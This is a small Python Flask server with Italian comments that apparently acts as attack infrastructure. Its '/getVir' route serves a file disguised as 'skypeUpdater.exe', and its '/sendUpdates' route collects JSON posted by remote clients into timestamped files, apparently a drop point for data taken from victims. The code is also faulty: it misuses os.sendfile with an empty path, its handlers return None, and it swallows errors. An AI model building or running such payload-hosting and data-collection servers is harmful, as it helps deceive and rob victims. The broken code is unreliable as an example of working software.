import json
import os
from flask import request
from datetime import datetime
import ssl
from flask import Flask

app = Flask(__name__)

# recupero il certificato autofirmato
certfile =  './cert.pem'
keyfile = './key.pem'

# configurazione contesto SSL
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile, keyfile)

# cartella dove salvare i file in arrivo
folder = "./uploads"

if not os.path.exists(folder):
    os.mkdir(folder)

# -------------- ROUTES --------------
    
@app.route('/getVir')
def getCandys():
    file_path = ''
    filename = 'skypeUpdater.exe'

    return os.sendfile(file_path, as_attachment=True, download_name=filename)

@app.route('/sendUpdates', methods=['POST'])
def upload():
    try:
        if request.method == 'POST':
            data = request.get_json()
            
            # ho dati, li elaboro
            if data:
                # nome del file con timestamp corrente
                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                filename = f"{timestamp}.json"
                
                # salvataggio del file
                file_path = os.path.join(folder, filename)
                with open(file_path, 'w') as f:
                    json.dump(data, f)
       
                return None
            
            # non ho dati
            else:
                return None
    except Exception as e:
        pass

if __name__ == '__main__':
    app.run(ssl_context=context, host='0.0.0.0', port=8443)